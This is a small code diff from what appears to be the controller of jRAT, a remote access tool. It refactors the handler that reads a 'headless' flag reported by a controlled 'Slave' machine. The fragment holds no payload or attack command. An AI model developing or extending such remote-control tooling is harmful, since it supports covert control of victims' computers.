@@ -2,13 +2,11 @@ package jrat.controller.packets.incoming;
 
 import jrat.controller.Slave;
 
-import java.io.DataInputStream;
-
 public class Packet20Headless extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
-		boolean headless = dis.readBoolean();
+	public void read(Slave slave) throws Exception {
+		boolean headless = slave.readBoolean();
 
 		slave.setHeadless(headless);
 	}
